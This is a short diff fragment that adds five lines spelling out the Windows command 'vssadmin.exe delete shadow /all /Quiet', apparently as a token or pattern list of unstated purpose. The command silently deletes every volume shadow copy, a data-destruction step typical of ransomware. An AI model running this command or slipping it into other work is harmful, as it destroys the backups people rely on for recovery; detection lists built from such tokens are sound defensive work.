@@ -1,0 +1,5 @@
+vssadmin.exe
+delete
+shadow
+/all
+/Quiet
